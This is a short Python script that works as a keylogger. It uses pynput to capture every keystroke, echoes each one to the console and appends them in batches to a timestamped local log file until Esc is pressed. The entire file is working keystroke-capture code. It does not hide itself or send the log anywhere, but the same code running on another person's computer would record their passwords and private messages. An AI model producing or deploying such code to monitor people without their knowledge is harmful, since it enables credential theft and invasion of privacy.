import pynput
from pynput.keyboard import Key, Listener
import datetime
import time

unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
count, keys = 0, []


def on_press(key):
    """Worker function to record keystrokes to a file in the background.

    Args:
        key (string): The current keystroke being pressed by the user.
    """
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    """Save the keystrokes to a textfile.

    Args:
        keys (list): List of all the keystrokes (size=10) by the user from the start of the program
                     which is later transferd to a file to be stored persistently. This "extra-steps"
                     are performed to reduce lag.
    """
    with open(f"log_{unix_time}.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "\n")
            if k.find("space") > 0:
                file.write("")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    """Kill the program on hitting the `Esc` button.

    Args:
        key (string): Record recent key.
    """
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
